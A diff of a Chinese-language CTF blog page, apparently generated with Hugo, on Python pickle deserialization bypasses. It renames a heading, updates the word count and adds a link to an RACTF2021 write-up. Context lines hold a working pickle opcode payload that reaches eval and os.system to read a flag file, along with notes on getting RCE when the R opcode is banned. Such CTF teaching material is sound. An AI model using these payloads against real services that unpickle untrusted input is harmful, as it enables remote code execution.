@@ -59,7 +59,7 @@
 <li><a href=#--仅可以引入builtins模块>&ndash;&#187;仅可以引入<code>builtins</code>模块</a></li>
 <li><a href=#--仅可以引入sys模块名字中不带点号>&ndash;&#187;仅可以引入<code>sys</code>模块&名字中不带<code>.</code>点号</a></li>
 <li><a href=#--仅可以引入题目中自设空模块>&ndash;&#187;仅可以引入题目中自设空模块</a></li>
-<li><a href=#禁止br>禁止b&rsquo;R'</a></li>
+<li><a href=#禁止br操作码>禁止<code>b'R'</code>操作码</a></li>
 <li><a href=#--变量覆盖>&ndash;&#187;变量覆盖</a></li>
 <li><a href=#--使用__setstate__bb实现rce>&ndash;&#187;使用<code>__setstate__</code>&<code>b'b'</code>实现rce</a></li>
 <li><a href=#--使用_instantiateload_objload_instbobi实现rce>&ndash;&#187;使用<code>_instantiate()</code>&<code>load_obj()</code>&<code>load_inst()</code>&<code>b'o'</code>&<code>b'i'</code>实现rce</a></li>
@@ -704,7 +704,7 @@ return
 </code></pre></div><p>opcode</p>
 <pre><code>b&quot;cstructs\n__dict__\np0\n0cstructs\n__builtins__\np1\n0cstructs\n__getattribute__\np2\n0g1\nS'__import__'\ng2\nsg0\nS'structs'\ng1\nscstructs\nget\np5\n0g5\n(S'eval'\ntRp6\n0g6\n(S'pickle.sys.modules['os'].system('cat ../flag.txt')'\ntR.&quot;
 </code></pre></details>
-<h3 id=禁止br>禁止b&rsquo;R'</h3>
+<h3 id=禁止br操作码>禁止<code>b'R'</code>操作码</h3>
 <p>也就相当于不可以用<code>__reduce__</code>，有以下几种应对方法（以下方法同样可以单独使用鸭！！！），变量覆盖（无直接代码执行）或利用<code>b'i'</code>，<code>b'i'</code>，<code>b'b'</code>这些操作码来rce。</p>
 <h3 id=--变量覆盖>&ndash;&#187;变量覆盖</h3>
 <details>
@@ -1183,7 +1183,7 @@ placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
 </div>
 <div class="text-sm text-gray-500 leading-tight a-gray">
 <br>
-Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 12609 words in this page.
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 12606 words in this page.
 </div>
 </div>
 </div>
@@ -1194,6 +1194,9 @@ Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiw
 <a class=flex-grow-0 href=/2021/08/08/redpwn2021-wp/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
 RedpwnCTF2021 Wp
 </a>
+<a class=flex-grow-0 href=/2021/08/18/ractf2021-wp/>
+RACTF2021 Wp
+<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a>
 </div>
 <div>
 </div>
